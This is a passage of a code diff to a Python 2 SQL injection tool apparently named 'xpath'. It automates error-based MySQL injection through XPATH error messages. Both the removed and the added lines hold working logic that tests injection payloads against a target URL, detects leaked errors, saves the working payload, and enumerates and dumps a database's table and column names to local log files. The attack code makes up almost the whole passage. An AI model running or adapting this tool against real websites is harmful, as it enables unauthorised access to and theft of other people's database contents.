-                                                                                                temp = temp
-                                                                                            pass
-                                                                                        except KeyboardInterrupt:
-                                                                                            print fg + sb + "Database: %s" % db
-                                                                                            print fg + sb + "[Dumped "+str(temp)+" tables]"
-                                                                                            #print fg + sb + tmp
-                                                                                            tab = pt(["tables"])
-                                                                                            tab.align = "l"
-                                                                                            tab.header = False
-                                                                                            for tbl in dumps:
-                                                                                                tab.add_row([tbl])
-                                                                                                pass
-                                                                                            print fg + sb + str(tab) 
-                                                                                            f.write(infos)
-                                                                                            f.write(str(tab)+"\n")
-                                                                                            f.close()
-                                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-                                                                                            KeyBoardInterrupt()
-                                                                                            break
-                                                                                        else:
-                                                                                            try:
-                                                                                                respdata = resp.read()
-                                                                                                name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                                if 'XPATH syntax error' in respdata:
-                                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
-                                                                                                    infos += "[*] %s\n" % name_of_tbls
-                                                                                                    tmp += "[*] %s\n" % name_of_tbls
-                                                                                                    dumps.append(name_of_tbls)
-                                                                                                    temp += 1
-                                                                                                    
-                                                                                            except IndexError as e:
-                                                                                                pass
-                                                                                            except Exception as e:
-                                                                                                #print '[-] %s' % e
-                                                                                                #sys.exit(0)
-                                                                                                pass
-                                                                                            except KeyboardInterrupt:
-                                                                                                KeyBoardInterrupt()
-                                                                                                break
-                                                                                    print fg + sb + "Database: %s" % db        
-                                                                                    print fg + sb + "["+str(noT)+" tables]"
-                                                                                    #print fg + sb + tmp
-                                                                                    tab = pt(["tables"])
-                                                                                    tab.align = "l"
-                                                                                    tab.header = False
-                                                                                    for tbl in dumps:
-                                                                                        tab.add_row([tbl])
-                                                                                        pass
-                                                                                    print fg + sn + str(tab) 
-                                                                                        
-                                                                            except IndexError as e:
-                                                                                pass
-                                                                            except Exception as e:
-                                                                                #print '[-] %s' % e
-                                                                                #sys.exit(0)
-                                                                                pass
-                                                                            except KeyboardInterrupt:
-                                                                                KeyBoardInterrupt()
-                                                                                break
-                                                                if dbvul:
-                                                                    break
-                                                    except IndexError as e:
-                                                        pass
-                                                    except Exception as e:
-                                                        #print '[-] %s' % e
-                                                        #sys.exit(0)
-                                                        pass
-                                                    except KeyboardInterrupt:
-                                                        KeyBoardInterrupt()
-                                                        break
-                                        if Query_Test:
-                                            break            
-                        if vul:
-                            break
-                    except (TypeError, IOError, IndexError):
-                        pass
-                    except KeyboardInterrupt:
-                        KeyBoardInterrupt()
+                                                                    
+                                                                print fw + sn + "Database: %s"%db
+                                                                print fw + sn + "["+str(noT)+" tables]"
+                                                                #print fw + sn + tmp
+                                                                tab = pt(["tables"])
+                                                                tab.align = "l"
+                                                                tab.header = False
+                                                                for tbl in dumps:
+                                                                    tab.add_row([tbl])
+                                                                    pass
+                                                                print fw + sn + str(tab) 
+                                                                
+                                                                    
+                                                        except IndexError as e:
+                                                            pass
+                                                        except Exception as e:
+                                                            #print '[-] %s' % e
+                                                            #sys.exit(0)
+                                                            pass
+                                                        except KeyboardInterrupt:
+                                                            KeyBoardInterrupt()
+                                                            break
+                                            if dbvul:
+                                                break
+                                except IndexError as e:
+                                    pass
+                                except Exception as e:
+                                    #print '[-] %s' % e
+                                    #sys.exit(0)
+                                    pass
+                                except KeyboardInterrupt:
+                                    KeyBoardInterrupt()
+                                    break
+                    if Query_Test:
                         break
-                    
-            f.write(infos)
-            f.write(str(tab)+"\n")
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-            
-        else:
-            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
-            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
-            with open(logs, "r") as prev_session:
-                for line in islice(prev_session,1,7):
-                    out = line.rstrip()
-                    if out:
-                        print fw + sn + out
-                        infos += out+"\n"
-            prev_session.close()
-            HTTPResponses(url, data)
-            Query_Test = False
-            tempfread = tempf.readline()
-            if wsr and war:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                infos += "web server technology: %s, %s\n" % (war, wsr)
-            else:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                infos += "web server technology: %s\n" % wsr
-            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-            infos += "the back-end DBMS: MySQL\n"
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
-            for QueryIndex in TBL_COUNT_FROM_DBS:
-                if not Query_Test:
-                   #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
-                    QueryToTest = QueryIndex % (db.encode('hex','strict'))
-                    if '0x72306f74' in tempfread:
-                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
-                        try:
-                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
-                            resp = urlopen(req, timeout=10)
-                        except URLError as e:
-                            URLError()
-                            sleep(1)
-                            pass
-                        except HTTPError as e:
-##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                            sleep(1)
-                            pass
-                        except (IOError, httplib.HTTPException) as e:
-                            ConnTimeOut()
-                            pass
-                        except KeyboardInterrupt:
-                            KeyBoardInterrupt()
-                            break
-                        else:
-                            try:
-                                respdata = resp.read()
-                                no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                if 'XPATH syntax error' in respdata:
-                                    Query_Test = True
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
-                                    dbvul = False
-                                    for QueryIndex in TBL_DUMP_FROM_DBS:
-                                        if not dbvul:
-                                            QueryToTest = QueryIndex % (db.encode('hex','strict'))
-                                            if '0x72306f74' in tempfread:
-                                                FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
-                                                try:
-                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
-                                                except URLError as e:
-                                                    URLError()
-                                                    sleep(1)
-                                                    pass
-                                                except HTTPError as e:
-##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                    sleep(1)
-                                                    pass
-                                                except (IOError, httplib.HTTPException) as e:
-                                                    ConnTimeOut()
-                                                    pass
-                                                except KeyboardInterrupt:
-                                                    KeyBoardInterrupt()
-                                                    break
-                                                else:
-                                                    try:
-                                                        respdata = resp.read()
-                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                        if 'XPATH syntax error' in respdata:
-                                                            dbvul = True
-                                                            DbDumpQuery = FinalCountQuery_replaced
-                                                            temp = 0
-                                                            noT = int(no_of_tbls)
-                                                            infos += "Database: %s\n" % db
-                                                            infos += "["+str(noT)+" tables]\n"
-                                                            #tmp = ""
-                                                            while temp < noT:
-                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                elif 'LIMIT%20' in DbDumpQuery:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
-                                                                else:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
-                                                                
-                                                                try:
-                                                                    req = Request(url, data=tempQuery, headers={'User-agent':ua})
-                                                                    resp = urlopen(req, timeout=10)
-                                                                except URLError as e:
-                                                                    URLError()
-                                                                    if temp==0:
-                                                                        temp=0
-                                                                    else:
-                                                                        temp = temp
-                                                                    sleep(1)
-                                                                    pass
-                                                                except HTTPError as e:
-##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                    sleep(1)
-                                                                    pass
-                                                                except (IOError, httplib.HTTPException) as e:
-                                                                    ConnTimeOut()
-                                                                    if temp==0:
-                                                                        temp=0
-                                                                    else:
-                                                                        temp = temp
-                                                                    pass
-                                                                except KeyboardInterrupt:
-                                                                    print fw + sn + "Database: %s"%db
-                                                                    print fw + sn + "[Dumped "+str(temp)+" tables]"
-                                                                    #print fw + sn + tmp
-                                                                    tab = pt(["tables"])
-                                                                    tab.align = "l"
-                                                                    tab.header = False
-                                                                    for tbl in dumps:
-                                                                        tab.add_row([tbl])
-                                                                        pass
-                                                                    print fw + sn + str(tab) 
-                                                                    f.write(infos)
-                                                                    f.write(str(tab)+"\n")
-                                                                    f.close()
-                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-                                                                    KeyBoardInterrupt()
-                                                                    break
-                                                                else:
-                                                                    try:
-                                                                        respdata = resp.read()
-                                                                        name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                        if 'XPATH syntax error' in respdata:
-                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
-                                                                            #infos += "[*] %s\n" % name_of_tbls
-                                                                            #tmp += "[*] %s\n" % name_of_tbls
-                                                                            dumps.append(name_of_tbls)
-                                                                            temp += 1
-                                                                            
-                                                                    except IndexError as e:
-                                                                        pass
-                                                                    except Exception as e:
-                                                                        #print '[-] %s' % e
-                                                                        #sys.exit(0)
-                                                                        pass
-                                                                    except KeyboardInterrupt:
-                                                                        KeyBoardInterrupt()
-                                                                        break
-                                                                
-                                                            print fw + sn + "Database: %s"%db
-                                                            print fw + sn + "["+str(noT)+" tables]"
-                                                            #print fw + sn + tmp
-                                                            tab = pt(["tables"])
-                                                            tab.align = "l"
-                                                            tab.header = False
-                                                            for tbl in dumps:
-                                                                tab.add_row([tbl])
-                                                                pass
-                                                            print fw + sn + str(tab) 
-                                                            
-                                                                
-                                                    except IndexError as e:
-                                                        pass
-                                                    except Exception as e:
-                                                        #print '[-] %s' % e
-                                                        #sys.exit(0)
-                                                        pass
-                                                    except KeyboardInterrupt:
-                                                        KeyBoardInterrupt()
-                                                        break
-                                        if dbvul:
-                                            break
-                            except IndexError as e:
-                                pass
-                            except Exception as e:
-                                #print '[-] %s' % e
-                                #sys.exit(0)
-                                pass
-                            except KeyboardInterrupt:
-                                KeyBoardInterrupt()
-                                break
-                if Query_Test:
-                    break
-            tempf.close()
-            f.write(infos)
-            f.write(str(tab)+"\n")
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-            infos = ""
+                tempf.close()
+                f.write(infos)
+                f.write(str(tab)+"\n")
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                infos = ""
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                pass
         
     else:
         pass
@@ -3828,29 +3867,311 @@ def dumpCols(url, data, db, tbl):
         try:
             tempf = open(payload,'r')
         except (Exception, IOError) as e:
-            if 'No such file or directory' in e:
-                vul = False
-                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
-                    try:
-                        if not vul:
-                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
-                            if '*' in url:
-                                first, last = url.split('*')
-                                tgt = first + temp + last
-                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
-                            else:
-                                tgt = url + temp
+            try:
+                if 'No such file or directory' in e:
+                    vul = False
+                    for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
+                        try:
+                            if not vul:
+                                temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
+                                if '*' in url:
+                                    first, last = url.split('*')
+                                    tgt = first + temp + last
+                                    #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
+                                else:
+                                    tgt = url + temp
+                                try:
+                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
+                                    req = Request(tgt, headers={'User-agent':ua})
+                                    HTTPReqCount += 1
+                                    resp = urlopen(req, timeout=10)
+                                except URLError as e:
+                                    URLError()
+                                    sleep(1)
+                                    pass
+                                except HTTPError as e:
+    ##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                    sleep(1)
+                                    pass
+                                except (IOError, httplib.HTTPException) as e:
+                                    ConnTimeOut()
+                                    pass
+                                except KeyboardInterrupt:
+                                    KeyBoardInterrupt()
+                                    break
+                                else:
+                                    try:
+                                        respdata = resp.read()
+                                        retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                        if 'XPATH syntax error' in respdata:
+                                            vul = True
+                                            print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
+                                            infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                            print fw + sn + 'Parameter: (GET)'
+                                            infos += 'Parameter: (GET)\n'
+                                            print fw + sn + '\tType: error-based'
+                                            infos += '\tType: error-based\n'
+                                            print fw + sn + '\tTitle: %s' % test
+                                            infos += '\tTitle: %s\n' % test
+                                            print fw + sn + '\tPayload: %s' % tgt
+                                            infos += '\tPayload: %s\n' % tgt
+                                            # ----------------------------------------
+                                            # for later usage of dumiping other things
+                                            CreatePayloadFile()
+                                            with open(payload,'w') as ft:
+                                                ft.write('%s' % tgt)
+                                                ft.close()
+                                            # ----------------------------------------
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                    except IndexError as e:
+                                        pass
+                                    except Exception as e:
+                                        #print '[-] %s' % e
+                                        pass
+                                    except KeyboardInterrupt:
+                                        KeyBoardInterrupt()
+                                        break
+                                    else:
+                                        Query_Test = False
+                                        if wsr and war:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                                            infos += "web server technology: %s, %s\n" % (war, wsr)
+                                        else:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                                            infos += "web server technology: %s\n" % wsr
+                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                                        infos += "the back-end DBMS: MySQL\n"
+                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
+                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
+                                        for QueryIndex in COL_COUNT_FROM_TBL:
+                                            if not Query_Test:
+                                                QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
+                                                if '0x72306f74' in tgt:
+                                                    FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                    try:
+                                                        req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
+                                                        resp = urlopen(req, timeout=10)
+                                                    except URLError as e:
+                                                        URLError()
+                                                        sleep(1)
+                                                        pass
+                                                    except HTTPError as e:
+    ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                        sleep(1)
+                                                        pass
+                                                    except (IOError, httplib.HTTPException) as e:
+                                                        ConnTimeOut()
+                                                        pass
+                                                    except KeyboardInterrupt:
+                                                        KeyBoardInterrupt()
+                                                        break
+                                                    else:
+                                                        try:
+                                                            respdata = resp.read()
+                                                            no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                            if 'XPATH syntax error' in respdata:
+                                                                Query_Test = True
+                                                                #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                                                if '0' in no_of_cols:
+                                                                    print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                                                    break
+                                                                else:
+                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                                                dbvul = False
+                                                                for QueryIndex in COL_DUMP_FROM_TBL:
+                                                                    if not dbvul:
+                                                                        QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
+                                                                        if '0x72306f74' in tgt:
+                                                                            FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                                            try:
+                                                                                req = Request(FinalDumpQuery_replaced, headers={'User-agent':ua})
+                                                                                resp = urlopen(req, timeout=10)
+                                                                            except URLError as e:
+                                                                                URLError()
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except HTTPError as e:
+    ##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except (IOError, httplib.HTTPException) as e:
+                                                                                ConnTimeOut()
+                                                                                pass
+                                                                            except KeyboardInterrupt:
+                                                                                KeyBoardInterrupt()
+                                                                                break
+                                                                            else:
+                                                                                try:
+                                                                                    respdata = resp.read()
+                                                                                    isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                    if 'XPATH syntax error' in respdata:
+                                                                                        dbvul = True
+                                                                                        DbDumpQuery = FinalDumpQuery_replaced
+                                                                                        temp = 0
+                                                                                        noc = int(no_of_cols)
+                                                                                        infos += "Database: %s\n" % db
+                                                                                        infos += "Table: %s\n" % tbl
+                                                                                        infos += "["+str(noc)+" columns]\n"
+                                                                                        #tmp = ""
+                                                                                        while temp < noc:
+                                                                                            if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                                            elif 'LIMIT%20' in DbDumpQuery:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
+                                                                                            else:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+
+                                                                                            try:
+                                                                                                req = Request(tempQuery, headers={'User-agent':ua})
+                                                                                                resp = urlopen(req, timeout=10)
+                                                                                            except URLError as e:
+                                                                                                URLError()
+                                                                                                if temp == 0:
+                                                                                                    temp = 0
+                                                                                                else:
+                                                                                                    temp = temp
+                                                                                                sleep(1)
+                                                                                                pass
+                                                                                            except HTTPError as e:
+    ##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                                sleep(1)
+                                                                                                pass
+                                                                                            except (IOError, httplib.HTTPException) as e:
+                                                                                                ConnTimeOut()
+                                                                                                if temp == 0:
+                                                                                                    temp = 0
+                                                                                                else:
+                                                                                                    temp = temp
+                                                                                                pass
+                                                                                            except KeyboardInterrupt:
+                                                                                                print fg + sb + "Database: %s" % db
+                                                                                                print fg + sb + "Table: %s" % tbl
+                                                                                                print fg + sb + "[Dumped "+str(temp)+" columns]"
+                                                                                                #print fg + sb + tmp
+                                                                                                col = pt(["columns"])
+                                                                                                col.align = "l"
+                                                                                                col.header = False
+                                                                                                for cols in dumps:
+                                                                                                    col.add_row([cols])
+                                                                                                    pass
+                                                                                                print fg + sn + str(col)
+                                                                                                f.write(infos)
+                                                                                                f.write(str(col)+"\n")
+                                                                                                f.close()
+                                                                                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                                                                                                KeyBoardInterrupt()
+                                                                                                break
+                                                                                            else:
+                                                                                                try:
+                                                                                                    respdata = resp.read()
+                                                                                                    name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                                    if 'XPATH syntax error' in respdata:
+                                                                                                        print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
+                                                                                                        #infos += "[*] %s\n" % name_of_cols
+                                                                                                        #tmp += "[*] %s\n" % name_of_cols
+                                                                                                        dumps.append(name_of_cols)
+                                                                                                        temp += 1
+                                                                                                        
+                                                                                                except IndexError as e:
+                                                                                                    pass
+                                                                                                except Exception as e:
+                                                                                                    #print '[-] %s' % e
+                                                                                                    #sys.exit(0)
+                                                                                                    pass
+                                                                                                except KeyboardInterrupt:
+                                                                                                    KeyBoardInterrupt()
+                                                                                                    break
+                                                                                        print fg + sb + "Database: %s" % db
+                                                                                        print fg + sb + "Table: %s" % tbl
+                                                                                        print fg + sb + "["+str(noc)+" columns]"
+                                                                                        #print fg + sb + tmp
+                                                                                        col = pt(["columns"])
+                                                                                        col.align = "l"
+                                                                                        col.header = False
+                                                                                        for cols in dumps:
+                                                                                            col.add_row([cols])
+                                                                                            pass
+                                                                                        print fg + sn + str(col)
+                                                                                            
+                                                                                except IndexError as e:
+                                                                                    pass
+                                                                                except Exception as e:
+                                                                                    #print '[-] %s' % e
+                                                                                    #sys.exit(0)
+                                                                                    pass
+                                                                                except KeyboardInterrupt:
+                                                                                    KeyBoardInterrupt()
+                                                                                    break
+                                                                    if dbvul:
+                                                                        break
+                                                        except IndexError as e:
+                                                            pass
+                                                        except Exception as e:
+                                                            #print '[-] %s' % e
+                                                            #sys.exit(0)
+                                                            pass
+                                                        except KeyboardInterrupt:
+                                                            KeyBoardInterrupt()
+                                                            break
+                                            if Query_Test:
+                                                break            
+                            if vul:
+                                break
+                        except (TypeError, IOError, IndexError):
+                            pass
+                        except KeyboardInterrupt:
+                            KeyBoardInterrupt()
+                            break
+                        
+                f.write(infos)
+                f.write(str(col)+"\n")
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                pass
+            
+        else:
+            try:
+                print fw + sn + "xpath resumed the following injection point(s) from stored session:"
+                infos += "\nxpath resumed the following injection point(s) from stored session:\n"
+                with open(logs, "r") as prev_session:
+                    for line in islice(prev_session,1,7):
+                        out = line.rstrip()
+                        if out:
+                            print fw + sn + out
+                            infos += out+"\n"
+                prev_session.close()
+                Query_Test = False
+                tempfread = tempf.readline()
+                url = None
+                if wsr and war:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                    infos += "web server technology: %s, %s\n" % (war, wsr)
+                else:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                    infos += "web server technology: %s\n" % wsr
+                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                infos += "the back-end DBMS: MySQL\n"
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
+                for QueryIndex in COL_COUNT_FROM_TBL:
+                    if not Query_Test:
+                        QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
+                        if '0x72306f74' in tempfread:
+                            FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                             try:
-                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
-                                req = Request(tgt, headers={'User-agent':ua})
-                                HTTPReqCount += 1
+                                req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                 resp = urlopen(req, timeout=10)
                             except URLError as e:
                                 URLError()
                                 sleep(1)
                                 pass
                             except HTTPError as e:
-##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+    ##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                 sleep(1)
                                 pass
                             except (IOError, httplib.HTTPException) as e:
@@ -3862,429 +4183,165 @@ def dumpCols(url, data, db, tbl):
                             else:
                                 try:
                                     respdata = resp.read()
-                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                    no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                     if 'XPATH syntax error' in respdata:
-                                        vul = True
-                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
-                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                        print fw + sn + 'Parameter: (GET)'
-                                        infos += 'Parameter: (GET)\n'
-                                        print fw + sn + '\tType: error-based'
-                                        infos += '\tType: error-based\n'
-                                        print fw + sn + '\tTitle: %s' % test
-                                        infos += '\tTitle: %s\n' % test
-                                        print fw + sn + '\tPayload: %s' % tgt
-                                        infos += '\tPayload: %s\n' % tgt
-                                        # ----------------------------------------
-                                        # for later usage of dumiping other things
-                                        CreatePayloadFile()
-                                        with open(payload,'w') as ft:
-                                            ft.write('%s' % tgt)
-                                            ft.close()
-                                        # ----------------------------------------
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                except IndexError as e:
-                                    pass
-                                except Exception as e:
-                                    #print '[-] %s' % e
-                                    pass
-                                except KeyboardInterrupt:
-                                    KeyBoardInterrupt()
-                                    break
-                                else:
-                                    Query_Test = False
-                                    if wsr and war:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                                        infos += "web server technology: %s, %s\n" % (war, wsr)
-                                    else:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                                        infos += "web server technology: %s\n" % wsr
-                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-                                    infos += "the back-end DBMS: MySQL\n"
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
-                                    for QueryIndex in COL_COUNT_FROM_TBL:
-                                        if not Query_Test:
-                                            QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
-                                            if '0x72306f74' in tgt:
-                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
-                                                try:
-                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
-                                                except URLError as e:
-                                                    URLError()
-                                                    sleep(1)
-                                                    pass
-                                                except HTTPError as e:
-##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                    sleep(1)
-                                                    pass
-                                                except (IOError, httplib.HTTPException) as e:
-                                                    ConnTimeOut()
-                                                    pass
-                                                except KeyboardInterrupt:
-                                                    KeyBoardInterrupt()
-                                                    break
-                                                else:
+                                        Query_Test = True
+                                        QueryToDumpDbNames = FinalCountQuery_replaced
+                                        #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                        if '0' in no_of_cols:
+                                            print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                            break
+                                        else:
+                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                        dbvul = False
+                                        for QueryIndex in COL_DUMP_FROM_TBL:
+                                            if not dbvul:
+                                                QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
+                                                if '0x72306f74' in tempfread:
+                                                    FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                     try:
-                                                        respdata = resp.read()
-                                                        no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                        if 'XPATH syntax error' in respdata:
-                                                            Query_Test = True
-                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
-                                                            dbvul = False
-                                                            for QueryIndex in COL_DUMP_FROM_TBL:
-                                                                if not dbvul:
-                                                                    QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
-                                                                    if '0x72306f74' in tgt:
-                                                                        FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                        req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
+                                                        resp = urlopen(req, timeout=10)
+                                                    except URLError as e:
+                                                        URLError()
+                                                        sleep(1)
+                                                        pass
+                                                    except HTTPError as e:
+    ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                        sleep(1)
+                                                        pass
+                                                    except (IOError, httplib.HTTPException) as e:
+                                                        ConnTimeOut()
+                                                        pass
+                                                    except KeyboardInterrupt:
+                                                        KeyBoardInterrupt()
+                                                        break
+                                                    else:
+                                                        try:
+                                                            respdata = resp.read()
+                                                            isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                            if 'XPATH syntax error' in respdata:
+                                                                dbvul = True
+                                                                DbDumpQuery = FinalCountQuery_replaced
+                                                                temp = 0
+                                                                noc = int(no_of_cols)
+                                                                infos += "Database: %s\n" % db
+                                                                infos += "Table: %s\n" % tbl
+                                                                infos += "["+str(noc)+" columns]\n"
+                                                                #tmp = ""
